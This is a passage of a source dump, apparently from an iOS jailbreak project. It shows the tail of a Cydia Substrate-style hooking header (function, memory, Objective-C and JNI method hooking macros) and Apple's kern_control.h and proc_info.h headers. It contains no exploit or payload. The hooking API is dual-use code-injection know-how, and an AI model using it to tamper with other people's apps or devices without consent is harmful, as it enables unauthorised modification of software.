    static _finline type _$ ## name ## $ ## dollar(Class _cls, type (*_old)(_class, SEL, ## args, ...), type (*_spr)(struct objc_super *, SEL, ## args, ...), _class self, SEL _cmd, ## args)

/* for((x=1;x!=7;++x)){ echo -n "#define MSMessage${x}_(extra, type, _class, name";for((y=0;y!=x;++y));do echo -n ", sel$y";done;for((y=0;y!=x;++y));do echo -n ", type$y, arg$y";done;echo ") \\";echo -n "    MSMessage_(extra, type, _class, name,";for((y=0;y!=x;++y));do if [[ $y -ne 0 ]];then echo -n " ##";fi;echo -n " sel$y ## $";done;echo -n ", ";for((y=0;y!=x;++y));do echo -n "sel$y:";done;echo -n ", (_cls, _old, _spr, self, _cmd";for((y=0;y!=x;++y));do echo -n ", arg$y";done;echo -n ")";for((y=0;y!=x;++y));do echo -n ", type$y arg$y";done;echo ")";} */

#define MSMessage0_(extra, type, _class, name, sel0) \
    MSMessage_(extra, type, _class, name, sel0, sel0, (_cls, _old, _spr, self, _cmd))
#define MSMessage1_(extra, type, _class, name, sel0, type0, arg0) \
    MSMessage_(extra, type, _class, name, sel0 ## $, sel0:, (_cls, _old, _spr, self, _cmd, arg0), type0 arg0)
#define MSMessage2_(extra, type, _class, name, sel0, sel1, type0, arg0, type1, arg1) \
    MSMessage_(extra, type, _class, name, sel0 ## $ ## sel1 ## $, sel0:sel1:, (_cls, _old, _spr, self, _cmd, arg0, arg1), type0 arg0, type1 arg1)
#define MSMessage3_(extra, type, _class, name, sel0, sel1, sel2, type0, arg0, type1, arg1, type2, arg2) \
    MSMessage_(extra, type, _class, name, sel0 ## $ ## sel1 ## $ ## sel2 ## $, sel0:sel1:sel2:, (_cls, _old, _spr, self, _cmd, arg0, arg1, arg2), type0 arg0, type1 arg1, type2 arg2)
#define MSMessage4_(extra, type, _class, name, sel0, sel1, sel2, sel3, type0, arg0, type1, arg1, type2, arg2, type3, arg3) \
    MSMessage_(extra, type, _class, name, sel0 ## $ ## sel1 ## $ ## sel2 ## $ ## sel3 ## $, sel0:sel1:sel2:sel3:, (_cls, _old, _spr, self, _cmd, arg0, arg1, arg2, arg3), type0 arg0, type1 arg1, type2 arg2, type3 arg3)
#define MSMessage5_(extra, type, _class, name, sel0, sel1, sel2, sel3, sel4, type0, arg0, type1, arg1, type2, arg2, type3, arg3, type4, arg4) \
    MSMessage_(extra, type, _class, name, sel0 ## $ ## sel1 ## $ ## sel2 ## $ ## sel3 ## $ ## sel4 ## $, sel0:sel1:sel2:sel3:sel4:, (_cls, _old, _spr, self, _cmd, arg0, arg1, arg2, arg3, arg4), type0 arg0, type1 arg1, type2 arg2, type3 arg3, type4 arg4)
#define MSMessage6_(extra, type, _class, name, sel0, sel1, sel2, sel3, sel4, sel5, type0, arg0, type1, arg1, type2, arg2, type3, arg3, type4, arg4, type5, arg5) \
    MSMessage_(extra, type, _class, name, sel0 ## $ ## sel1 ## $ ## sel2 ## $ ## sel3 ## $ ## sel4 ## $ ## sel5 ## $, sel0:sel1:sel2:sel3:sel4:sel5:, (_cls, _old, _spr, self, _cmd, arg0, arg1, arg2, arg3, arg4, arg5), type0 arg0, type1 arg1, type2 arg2, type3 arg3, type4 arg4, type5 arg5)
#define MSMessage7_(extra, type, _class, name, sel0, sel1, sel2, sel3, sel4, sel5, sel6, type0, arg0, type1, arg1, type2, arg2, type3, arg3, type4, arg4, type5, arg5, type6, arg6) \
    MSMessage_(extra, type, _class, name, sel0 ## $ ## sel1 ## $ ## sel2 ## $ ## sel3 ## $ ## sel4 ## $ ## sel5 ## $ ## sel6 ## $, sel0:sel1:sel2:sel3:sel4:sel5:sel6:, (_cls, _old, _spr, self, _cmd, arg0, arg1, arg2, arg3, arg4, arg5, arg6), type0 arg0, type1 arg1, type2 arg2, type3 arg3, type4 arg4, type5 arg5, type6 arg6)
#define MSMessage8_(extra, type, _class, name, sel0, sel1, sel2, sel3, sel4, sel5, sel6, sel7, type0, arg0, type1, arg1, type2, arg2, type3, arg3, type4, arg4, type5, arg5, type6, arg6, type7, arg7) \
    MSMessage_(extra, type, _class, name, sel0 ## $ ## sel1 ## $ ## sel2 ## $ ## sel3 ## $ ## sel4 ## $ ## sel5 ## $ ## sel6 ## $ ## sel7 ## $, sel0:sel1:sel2:sel3:sel4:sel5:sel6:sel7:, (_cls, _old, _spr, self, _cmd, arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7), type0 arg0, type1 arg1, type2 arg2, type3 arg3, type4 arg4, type5 arg5, type6 arg6, type7 arg7)

#define MSInstanceMessage0(type, _class, args...) MSMessage0_(MSIgnore_, type, _class *, _class, ## args)
#define MSInstanceMessage1(type, _class, args...) MSMessage1_(MSIgnore_, type, _class *, _class, ## args)
#define MSInstanceMessage2(type, _class, args...) MSMessage2_(MSIgnore_, type, _class *, _class, ## args)
#define MSInstanceMessage3(type, _class, args...) MSMessage3_(MSIgnore_, type, _class *, _class, ## args)
#define MSInstanceMessage4(type, _class, args...) MSMessage4_(MSIgnore_, type, _class *, _class, ## args)
#define MSInstanceMessage5(type, _class, args...) MSMessage5_(MSIgnore_, type, _class *, _class, ## args)
#define MSInstanceMessage6(type, _class, args...) MSMessage6_(MSIgnore_, type, _class *, _class, ## args)
#define MSInstanceMessage7(type, _class, args...) MSMessage7_(MSIgnore_, type, _class *, _class, ## args)
#define MSInstanceMessage8(type, _class, args...) MSMessage8_(MSIgnore_, type, _class *, _class, ## args)

#define MSClassMessage0(type, _class, args...) MSMessage0_(MSIgnore_, type, Class, $ ## _class, ## args)
#define MSClassMessage1(type, _class, args...) MSMessage1_(MSIgnore_, type, Class, $ ## _class, ## args)
#define MSClassMessage2(type, _class, args...) MSMessage2_(MSIgnore_, type, Class, $ ## _class, ## args)
#define MSClassMessage3(type, _class, args...) MSMessage3_(MSIgnore_, type, Class, $ ## _class, ## args)
#define MSClassMessage4(type, _class, args...) MSMessage4_(MSIgnore_, type, Class, $ ## _class, ## args)
#define MSClassMessage5(type, _class, args...) MSMessage5_(MSIgnore_, type, Class, $ ## _class, ## args)
#define MSClassMessage6(type, _class, args...) MSMessage6_(MSIgnore_, type, Class, $ ## _class, ## args)
#define MSClassMessage7(type, _class, args...) MSMessage7_(MSIgnore_, type, Class, $ ## _class, ## args)
#define MSClassMessage8(type, _class, args...) MSMessage8_(MSIgnore_, type, Class, $ ## _class, ## args)

#define MSInstanceMessageHook0(type, _class, args...) MSMessage0_(MSRegister_, type, _class *, _class, ## args)
#define MSInstanceMessageHook1(type, _class, args...) MSMessage1_(MSRegister_, type, _class *, _class, ## args)
#define MSInstanceMessageHook2(type, _class, args...) MSMessage2_(MSRegister_, type, _class *, _class, ## args)
#define MSInstanceMessageHook3(type, _class, args...) MSMessage3_(MSRegister_, type, _class *, _class, ## args)
#define MSInstanceMessageHook4(type, _class, args...) MSMessage4_(MSRegister_, type, _class *, _class, ## args)
#define MSInstanceMessageHook5(type, _class, args...) MSMessage5_(MSRegister_, type, _class *, _class, ## args)
#define MSInstanceMessageHook6(type, _class, args...) MSMessage6_(MSRegister_, type, _class *, _class, ## args)
#define MSInstanceMessageHook7(type, _class, args...) MSMessage7_(MSRegister_, type, _class *, _class, ## args)
#define MSInstanceMessageHook8(type, _class, args...) MSMessage8_(MSRegister_, type, _class *, _class, ## args)

#define MSClassMessageHook0(type, _class, args...) MSMessage0_(MSRegister_, type, Class, $ ## _class, ## args)
#define MSClassMessageHook1(type, _class, args...) MSMessage1_(MSRegister_, type, Class, $ ## _class, ## args)
#define MSClassMessageHook2(type, _class, args...) MSMessage2_(MSRegister_, type, Class, $ ## _class, ## args)
#define MSClassMessageHook3(type, _class, args...) MSMessage3_(MSRegister_, type, Class, $ ## _class, ## args)
#define MSClassMessageHook4(type, _class, args...) MSMessage4_(MSRegister_, type, Class, $ ## _class, ## args)
#define MSClassMessageHook5(type, _class, args...) MSMessage5_(MSRegister_, type, Class, $ ## _class, ## args)
#define MSClassMessageHook6(type, _class, args...) MSMessage6_(MSRegister_, type, Class, $ ## _class, ## args)
#define MSClassMessageHook7(type, _class, args...) MSMessage7_(MSRegister_, type, Class, $ ## _class, ## args)
#define MSClassMessageHook8(type, _class, args...) MSMessage8_(MSRegister_, type, Class, $ ## _class, ## args)

#define MSOldCall(args...) \
    _old(self, _cmd, ## args)
#define MSSuperCall(args...) \
    _spr((struct objc_super[1]) {{self, class_getSuperclass(_cls)}}, _cmd, ## args)

#define MSIvarHook(type, name) \
    type &name(MSHookIvar<type>(self, #name))

#define MSClassHook(name) \
    @class name; \
    static Class $ ## name = objc_getClass(#name);
#define MSMetaClassHook(name) \
    @class name; \
    static Class $$ ## name = object_getClass($ ## name);

#endif/*__APPLE__*/

template <typename Type_>
static inline void MSHookFunction(Type_ *symbol, Type_ *replace, Type_ **result) {
    return MSHookFunction(
        reinterpret_cast<void *>(symbol),
        reinterpret_cast<void *>(replace),
        reinterpret_cast<void **>(result)
    );
}

template <typename Type_>
static inline void MSHookFunction(Type_ *symbol, Type_ *replace) {
    return MSHookFunction(symbol, replace, reinterpret_cast<Type_ **>(NULL));
}

template <typename Type_>
static inline void MSHookSymbol(Type_ *&value, const char *name, MSImageRef image = NULL) {
    value = reinterpret_cast<Type_ *>(MSFindSymbol(image, name));
}

template <typename Type_>
static inline void MSHookFunction(const char *name, Type_ *replace, Type_ **result = NULL) {
    Type_ *symbol;
    MSHookSymbol(symbol, name);
    return MSHookFunction(symbol, replace, result);
}

template <typename Type_>
static inline void MSHookFunction(MSImageRef image, const char *name, Type_ *replace, Type_ **result = NULL) {
    Type_ *symbol;
    MSHookSymbol(symbol, name, image);
    return MSHookFunction(symbol, replace, result);
}

template <typename Type_>
static inline void MSHookMemory(Type_ *target, const void *data, size_t size) {
    return MSHookMemory(reinterpret_cast<void *>(target), data, size);
}

#endif

// g++ versions before 4.7 define __cplusplus to 1
// http://gcc.gnu.org/bugzilla/show_bug.cgi?id=1773
#if __cplusplus >= 201103L || defined(__GXX_EXPERIMENTAL_CXX0X__)

#ifdef __ANDROID__

template <typename Type_, typename Kind_, typename... Args_>
static inline void MSJavaHookMethod(JNIEnv *jni, jclass _class, jmethodID method, Type_ (*replace)(JNIEnv *, Kind_, Args_...), Type_ (**result)(JNIEnv *, Kind_, ...)) {
    return MSJavaHookMethod(
        jni, _class, method,
        reinterpret_cast<void *>(replace),
        reinterpret_cast<void **>(result)
    );
}

#endif

#endif

#ifdef __ANDROID__

#ifdef __cplusplus

static inline void MSAndroidGetPackage(JNIEnv *jni, jobject global, const char *name, jobject &local, jobject &loader) {
    jclass Context(jni->FindClass("android/content/Context"));
    jmethodID Context$createPackageContext(jni->GetMethodID(Context, "createPackageContext", "(Ljava/lang/String;I)Landroid/content/Context;"));
    jmethodID Context$getClassLoader(jni->GetMethodID(Context, "getClassLoader", "()Ljava/lang/ClassLoader;"));

    jstring string(jni->NewStringUTF(name));
    local = jni->CallObjectMethod(global, Context$createPackageContext, string, 3);
    loader = jni->CallObjectMethod(local, Context$getClassLoader);
}

static inline jclass MSJavaFindClass(JNIEnv *jni, jobject loader, const char *name) {
    jclass Class(jni->FindClass("java/lang/Class"));
    jmethodID Class$forName(jni->GetStaticMethodID(Class, "forName", "(Ljava/lang/String;ZLjava/lang/ClassLoader;)Ljava/lang/Class;"));

    jstring string(jni->NewStringUTF(name));
    jobject _class(jni->CallStaticObjectMethod(Class, Class$forName, string, JNI_TRUE, loader));

    if (jni->ExceptionCheck()) {
        jni->ExceptionClear();
        return NULL;
    }

    return reinterpret_cast<jclass>(_class);
}

_disused static void MSJavaCleanWeak(void *data, JNIEnv *jni, void *value) {
    jni->DeleteWeakGlobalRef(reinterpret_cast<jweak>(value));
}

#endif

#endif

#define MSHook(type, name, args...) \
    _disused static type (*_ ## name)(args); \
    static type $ ## name(args)

#define MSJavaHook(type, name, arg0, args...) \
    _disused static type (*_ ## name)(JNIEnv *jni, arg0, ...); \
    static type $ ## name(JNIEnv *jni, arg0, ## args)

#ifdef __cplusplus
#define MSHake(name) \
    &$ ## name, &_ ## name
#else
#define MSHake(name) \
    &$ ## name, (void **) &_ ## name
#endif

#define SubstrateConcat_(lhs, rhs) \
    lhs ## rhs
#define SubstrateConcat(lhs, rhs) \
    SubstrateConcat_(lhs, rhs)

#define SubstrateStringize(value) \
    #value

#ifdef __APPLE__
    #define SubstrateSection \
        __attribute__((__section__("__TEXT, __substrate")))
#else
    #define SubstrateSection \
        __attribute__((__section__(".substrate")))
#endif

#ifdef __APPLE__
#define MSFilterCFBundleID "Filter:CFBundleID"
#define MSFilterObjC_Class "Filter:ObjC.Class"
#endif

#ifdef __ANDROID__
#define MSFilterLibrary "Filter:Library"
#endif

#define MSFilterCFVersion "Filter:CFVersion"
#define MSFilterExecutable "Filter:Executable"

#define MSConfig(name, value) \
    extern const char SubstrateConcat(_substrate_, __LINE__)[] SubstrateSection; \
    const char SubstrateConcat(_substrate_, __LINE__)[] SubstrateSection = name "=" value;

#define MSConfigValue(name, value) \
    char SubstrateConcat(_substrate_MSConfigValue_Invalid_, __LINE__)[((double)value, 0)]; \
    const char SubstrateConcat(_substrate_, __LINE__)[] SubstrateSection = name "=" SubstrateStringize(value);

#define MSConfigRange(name, lo, hi) \
    char SubstrateConcat(_substrate_MSConfigRange_Invalid_, __LINE__)[(double)lo <= (double)hi ? 0 : -1]; \
    MSConfig(name, SubstrateStringize(lo) "," SubstrateStringize(hi))

#ifdef __cplusplus
#define MSInitialize \
    static void SubstrateConcat(_MSInitialize, __LINE__)(void); \
    namespace { static class SubstrateConcat($MSInitialize, __LINE__) { public: _finline SubstrateConcat($MSInitialize, __LINE__)() { \
        SubstrateConcat(_MSInitialize, __LINE__)(); \
    } } SubstrateConcat($MSInitialize, __LINE__); } \
    static void SubstrateConcat(_MSInitialize, __LINE__)()
#else
#define MSInitialize \
    __attribute__((__constructor__)) static void SubstrateConcat(_MSInitialize, __LINE__)(void)
#endif

#define Foundation_f "/System/Library/Frameworks/Foundation.framework/Foundation"
#define UIKit_f "/System/Library/Frameworks/UIKit.framework/UIKit"
#define JavaScriptCore_f "/System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore"
#define IOKit_f "/System/Library/Frameworks/IOKit.framework/IOKit"

#endif//SUBSTRATE_H_

```

`BaseBin/_external/include/sys/kern_control.h`:

```h
/*
 * Copyright (c) 2000-2004, 2012-2016 Apple Inc. All rights reserved.
 *
 * @APPLE_OSREFERENCE_LICENSE_HEADER_START@
 *
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. The rights granted to you under the License
 * may not be used to create, or enable the creation or redistribution of,
 * unlawful or unlicensed copies of an Apple operating system, or to
 * circumvent, violate, or enable the circumvention or violation of, any
 * terms of an Apple operating system software license agreement.
 *
 * Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this file.
 *
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 *
 * @APPLE_OSREFERENCE_LICENSE_HEADER_END@
 */
/*!
 *       @header kern_control.h
 *       This header defines an API to communicate between a kernel
 *       extension and a process outside of the kernel.
 */

#ifndef KPI_KERN_CONTROL_H
#define KPI_KERN_CONTROL_H


#include <sys/appleapiopts.h>
#include <sys/_types/_u_char.h>
#include <sys/_types/_u_int16_t.h>
#include <sys/_types/_u_int32_t.h>
#include <sys/_types/_u_int64_t.h>

/*
 * Define Controller event subclass, and associated events.
 * Subclass of KEV_SYSTEM_CLASS
 */

/*!
 *       @defined KEV_CTL_SUBCLASS
 *   @discussion The kernel event subclass for kernel control events.
 */
#define KEV_CTL_SUBCLASS        2

/*!
 *       @defined KEV_CTL_REGISTERED
 *   @discussion The event code indicating a new controller was
 *       registered. The data portion will contain a ctl_event_data.
 */
#define KEV_CTL_REGISTERED      1       /* a new controller appears */

/*!
 *       @defined KEV_CTL_DEREGISTERED
 *   @discussion The event code indicating a controller was unregistered.
 *       The data portion will contain a ctl_event_data.
 */
#define KEV_CTL_DEREGISTERED    2       /* a controller disappears */

/*!
 *       @struct ctl_event_data
 *       @discussion This structure is used for KEV_CTL_SUBCLASS kernel
 *               events.
 *       @field ctl_id The kernel control id.
 *       @field ctl_unit The kernel control unit.
 */
struct ctl_event_data {
	u_int32_t   ctl_id;             /* Kernel Controller ID */
	u_int32_t   ctl_unit;
};

/*
 * Controls destined to the Controller Manager.
 */

/*!
 *       @defined CTLIOCGCOUNT
 *   @discussion The CTLIOCGCOUNT ioctl can be used to determine the
 *       number of kernel controllers registered.
 */
#define CTLIOCGCOUNT    _IOR('N', 2, int)               /* get number of control structures registered */

/*!
 *       @defined CTLIOCGINFO
 *   @discussion The CTLIOCGINFO ioctl can be used to convert a kernel
 *       control name to a kernel control id.
 */
#define CTLIOCGINFO     _IOWR('N', 3, struct ctl_info)  /* get id from name */


/*!
 *       @defined MAX_KCTL_NAME
 *   @discussion Kernel control names must be no longer than
 *       MAX_KCTL_NAME.
 */
#define MAX_KCTL_NAME   96

/*
 * Controls destined to the Controller Manager.
 */

/*!
 *       @struct ctl_info
 *       @discussion This structure is used with the CTLIOCGINFO ioctl to
 *               translate from a kernel control name to a control id.
 *       @field ctl_id The kernel control id, filled out upon return.
 *       @field ctl_name The kernel control name to find.
 */
struct ctl_info {
	u_int32_t   ctl_id;                             /* Kernel Controller ID  */
	char        ctl_name[MAX_KCTL_NAME];            /* Kernel Controller Name (a C string) */
};


/*!
 *       @struct sockaddr_ctl
 *       @discussion The controller address structure is used to establish
 *               contact between a user client and a kernel controller. The
 *               sc_id/sc_unit uniquely identify each controller. sc_id is a
 *               unique identifier assigned to the controller. The identifier can
 *               be assigned by the system at registration time or be a 32-bit
 *               creator code obtained from Apple Computer. sc_unit is a unit
 *               number for this sc_id, and is privately used by the kernel
 *               controller to identify several instances of the controller.
 *       @field sc_len The length of the structure.
 *       @field sc_family AF_SYSTEM.
 *       @field ss_sysaddr AF_SYS_KERNCONTROL.
 *       @field sc_id Controller unique identifier.
 *       @field sc_unit Kernel controller private unit number.
 *       @field sc_reserved Reserved, must be set to zero.
 */
struct sockaddr_ctl {
	u_char      sc_len;     /* depends on size of bundle ID string */
	u_char      sc_family;  /* AF_SYSTEM */
	u_int16_t   ss_sysaddr; /* AF_SYS_KERNCONTROL */
	u_int32_t   sc_id;      /* Controller unique identifier  */
	u_int32_t   sc_unit;    /* Developer private unit number */
	u_int32_t   sc_reserved[5];
};



#endif /* KPI_KERN_CONTROL_H */

```

`BaseBin/_external/include/sys/proc_info.h`:

```h
/*
 * Copyright (c) 2005-2021 Apple Inc. All rights reserved.
 *
 * @APPLE_OSREFERENCE_LICENSE_HEADER_START@
 *
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. The rights granted to you under the License
 * may not be used to create, or enable the creation or redistribution of,
 * unlawful or unlicensed copies of an Apple operating system, or to
 * circumvent, violate, or enable the circumvention or violation of, any
 * terms of an Apple operating system software license agreement.
 *
 * Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this file.
 *
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 *
 * @APPLE_OSREFERENCE_LICENSE_HEADER_END@
 */

#ifndef _SYS_PROC_INFO_H
#define _SYS_PROC_INFO_H

#include <sys/cdefs.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/kern_control.h>
#include <sys/event.h>
#include <net/if.h>
#include <mach/machine.h>
#include <uuid/uuid.h>

__BEGIN_DECLS


#define PROC_ALL_PIDS           1
#define PROC_PGRP_ONLY          2
#define PROC_TTY_ONLY           3
#define PROC_UID_ONLY           4
#define PROC_RUID_ONLY          5
#define PROC_PPID_ONLY          6
#define PROC_KDBG_ONLY          7

struct proc_bsdinfo {
	uint32_t                pbi_flags;              /* 64bit; emulated etc */
	uint32_t                pbi_status;
	uint32_t                pbi_xstatus;
	uint32_t                pbi_pid;
	uint32_t                pbi_ppid;
	uid_t                   pbi_uid;
	gid_t                   pbi_gid;
	uid_t                   pbi_ruid;
	gid_t                   pbi_rgid;
	uid_t                   pbi_svuid;
	gid_t                   pbi_svgid;
	uint32_t                rfu_1;                  /* reserved */
	char                    pbi_comm[MAXCOMLEN];
	char                    pbi_name[2 * MAXCOMLEN];  /* empty if no name is registered */
	uint32_t                pbi_nfiles;
	uint32_t                pbi_pgid;
	uint32_t                pbi_pjobc;
	uint32_t                e_tdev;                 /* controlling tty dev */
	uint32_t                e_tpgid;                /* tty process group id */
	int32_t                 pbi_nice;
	uint64_t                pbi_start_tvsec;
	uint64_t                pbi_start_tvusec;
};


struct proc_bsdshortinfo {
	uint32_t                pbsi_pid;               /* process id */
	uint32_t                pbsi_ppid;              /* process parent id */
	uint32_t                pbsi_pgid;              /* process perp id */
	uint32_t                pbsi_status;            /* p_stat value, SZOMB, SRUN, etc */
	char                    pbsi_comm[MAXCOMLEN];   /* upto 16 characters of process name */
	uint32_t                pbsi_flags;              /* 64bit; emulated etc */
	uid_t                   pbsi_uid;               /* current uid on process */
	gid_t                   pbsi_gid;               /* current gid on process */
	uid_t                   pbsi_ruid;              /* current ruid on process */
	gid_t                   pbsi_rgid;              /* current tgid on process */
	uid_t                   pbsi_svuid;             /* current svuid on process */
	gid_t                   pbsi_svgid;             /* current svgid on process */
	uint32_t                pbsi_rfu;               /* reserved for future use*/
};


/* pbi_flags values */
#define PROC_FLAG_SYSTEM        1       /*  System process */
#define PROC_FLAG_TRACED        2       /* process currently being traced, possibly by gdb */
#define PROC_FLAG_INEXIT        4       /* process is working its way in exit() */
#define PROC_FLAG_PPWAIT        8
#define PROC_FLAG_LP64          0x10    /* 64bit process */
#define PROC_FLAG_SLEADER       0x20    /* The process is the session leader */
#define PROC_FLAG_CTTY          0x40    /* process has a control tty */
#define PROC_FLAG_CONTROLT      0x80    /* Has a controlling terminal */
#define PROC_FLAG_THCWD         0x100   /* process has a thread with cwd */
/* process control bits for resource starvation */
#define PROC_FLAG_PC_THROTTLE   0x200   /* In resource starvation situations, this process is to be throttled */
#define PROC_FLAG_PC_SUSP       0x400   /* In resource starvation situations, this process is to be suspended */
#define PROC_FLAG_PC_KILL       0x600   /* In resource starvation situations, this process is to be terminated */
#define PROC_FLAG_PC_MASK       0x600
/* process action bits for resource starvation */
#define PROC_FLAG_PA_THROTTLE   0x800   /* The process is currently throttled due to resource starvation */
#define PROC_FLAG_PA_SUSP       0x1000  /* The process is currently suspended due to resource starvation */
#define PROC_FLAG_PSUGID        0x2000   /* process has set privileges since last exec */
#define PROC_FLAG_EXEC          0x4000   /* process has called exec  */


struct proc_taskinfo {
	uint64_t                pti_virtual_size;       /* virtual memory size (bytes) */
	uint64_t                pti_resident_size;      /* resident memory size (bytes) */
	uint64_t                pti_total_user;         /* total time */
	uint64_t                pti_total_system;
	uint64_t                pti_threads_user;       /* existing threads only */
	uint64_t                pti_threads_system;
	int32_t                 pti_policy;             /* default policy for new threads */
	int32_t                 pti_faults;             /* number of page faults */
	int32_t                 pti_pageins;            /* number of actual pageins */
	int32_t                 pti_cow_faults;         /* number of copy-on-write faults */
	int32_t                 pti_messages_sent;      /* number of messages sent */
	int32_t                 pti_messages_received;  /* number of messages received */
	int32_t                 pti_syscalls_mach;      /* number of mach system calls */
	int32_t                 pti_syscalls_unix;      /* number of unix system calls */
	int32_t                 pti_csw;                /* number of context switches */
	int32_t                 pti_threadnum;          /* number of threads in the task */
	int32_t                 pti_numrunning;         /* number of running threads */
	int32_t                 pti_priority;           /* task priority*/
};

struct proc_taskallinfo {
	struct proc_bsdinfo     pbsd;
	struct proc_taskinfo    ptinfo;
};

#define MAXTHREADNAMESIZE 64

struct proc_threadinfo {
	uint64_t                pth_user_time;          /* user run time */
	uint64_t                pth_system_time;        /* system run time */
	int32_t                 pth_cpu_usage;          /* scaled cpu usage percentage */
	int32_t                 pth_policy;             /* scheduling policy in effect */
	int32_t                 pth_run_state;          /* run state (see below) */
	int32_t                 pth_flags;              /* various flags (see below) */
	int32_t                 pth_sleep_time;         /* number of seconds that thread */
	int32_t                 pth_curpri;             /* cur priority*/
	int32_t                 pth_priority;           /*  priority*/
	int32_t                 pth_maxpriority;        /* max priority*/
	char                    pth_name[MAXTHREADNAMESIZE];    /* thread name, if any */
};

struct proc_regioninfo {
	uint32_t                pri_protection;
	uint32_t                pri_max_protection;
	uint32_t                pri_inheritance;
	uint32_t                pri_flags;              /* shared, external pager, is submap */
	uint64_t                pri_offset;
	uint32_t                pri_behavior;
	uint32_t                pri_user_wired_count;
	uint32_t                pri_user_tag;
	uint32_t                pri_pages_resident;
	uint32_t                pri_pages_shared_now_private;
	uint32_t                pri_pages_swapped_out;
	uint32_t                pri_pages_dirtied;
	uint32_t                pri_ref_count;
	uint32_t                pri_shadow_depth;
	uint32_t                pri_share_mode;
	uint32_t                pri_private_pages_resident;
	uint32_t                pri_shared_pages_resident;
	uint32_t                pri_obj_id;
	uint32_t                pri_depth;
	uint64_t                pri_address;
	uint64_t                pri_size;
};

#define PROC_REGION_SUBMAP      1
#define PROC_REGION_SHARED      2

#define SM_COW             1
#define SM_PRIVATE         2
#define SM_EMPTY           3
#define SM_SHARED          4
#define SM_TRUESHARED      5
#define SM_PRIVATE_ALIASED 6
#define SM_SHARED_ALIASED  7
#define SM_LARGE_PAGE      8


/*
 *	Thread run states (state field).
 */

#define TH_STATE_RUNNING        1       /* thread is running normally */
#define TH_STATE_STOPPED        2       /* thread is stopped */
#define TH_STATE_WAITING        3       /* thread is waiting normally */
#define TH_STATE_UNINTERRUPTIBLE 4      /* thread is in an uninterruptible
	                                 *  wait */
#define TH_STATE_HALTED         5       /* thread is halted at a
	                                 *  clean point */

/*
 *	Thread flags (flags field).
 */
#define TH_FLAGS_SWAPPED        0x1     /* thread is swapped out */
#define TH_FLAGS_IDLE           0x2     /* thread is an idle thread */


struct proc_workqueueinfo {
	uint32_t        pwq_nthreads;           /* total number of workqueue threads */
	uint32_t        pwq_runthreads;         /* total number of running workqueue threads */
	uint32_t        pwq_blockedthreads;     /* total number of blocked workqueue threads */
	uint32_t        pwq_state;
};

/*
 *	workqueue state (pwq_state field)
 */
#define WQ_EXCEEDED_CONSTRAINED_THREAD_LIMIT 0x1
#define WQ_EXCEEDED_TOTAL_THREAD_LIMIT 0x2
#define WQ_FLAGS_AVAILABLE 0x4
/*
 * WQ_EXCEEDED_COOPERATIVE_THREAD_LIMIT is set if wq has scheduled cooperative
 * threads upto the cooperative thread pool limit and there is still more work
 * pending in the cooperative pool that require a thread.
 */
#define WQ_EXCEEDED_COOPERATIVE_THREAD_LIMIT 0x8
/*
 * WQ_EXCEEDED_ACTIVE_CONSTRAINED_THREAD_LIMIT is set when wq has pending thread
 * requests for the constrained thread pool; but, has failed the allowance check
 * because of active thread limit.
 */
#define WQ_EXCEEDED_ACTIVE_CONSTRAINED_THREAD_LIMIT 0x10

struct proc_fileinfo {
	uint32_t                fi_openflags;
	uint32_t                fi_status;
	off_t                   fi_offset;
	int32_t                 fi_type;
	uint32_t                fi_guardflags;
};

/* stats flags in proc_fileinfo */
#define PROC_FP_SHARED  1       /* shared by more than one fd */
#define PROC_FP_CLEXEC  2       /* close on exec */
#define PROC_FP_GUARDED 4       /* guarded fd */
#define PROC_FP_CLFORK  8       /* close on fork */

#define PROC_FI_GUARD_CLOSE             (1u << 0)
#define PROC_FI_GUARD_DUP               (1u << 1)
#define PROC_FI_GUARD_SOCKET_IPC        (1u << 2)
#define PROC_FI_GUARD_FILEPORT          (1u << 3)

struct proc_exitreasonbasicinfo {
	uint32_t                        beri_namespace;
	uint64_t                        beri_code;
	uint64_t                        beri_flags;
	uint32_t                        beri_reason_buf_size;
} __attribute__((packed));

struct proc_exitreasoninfo {
	uint32_t                        eri_namespace;
	uint64_t                        eri_code;
	uint64_t                        eri_flags;
	uint32_t                        eri_reason_buf_size;
	uint64_t                        eri_kcd_buf;
} __attribute__((packed));

/*
 * A copy of stat64 with static sized fields.
 */
struct vinfo_stat {
	uint32_t        vst_dev;        /* [XSI] ID of device containing file */
	uint16_t        vst_mode;       /* [XSI] Mode of file (see below) */
	uint16_t        vst_nlink;      /* [XSI] Number of hard links */
	uint64_t        vst_ino;        /* [XSI] File serial number */
	uid_t           vst_uid;        /* [XSI] User ID of the file */
	gid_t           vst_gid;        /* [XSI] Group ID of the file */
	int64_t         vst_atime;      /* [XSI] Time of last access */
	int64_t         vst_atimensec;  /* nsec of last access */
	int64_t         vst_mtime;      /* [XSI] Last data modification time */
	int64_t         vst_mtimensec;  /* last data modification nsec */
	int64_t         vst_ctime;      /* [XSI] Time of last status change */
	int64_t         vst_ctimensec;  /* nsec of last status change */
	int64_t         vst_birthtime;  /*  File creation time(birth)  */
	int64_t         vst_birthtimensec;      /* nsec of File creation time */
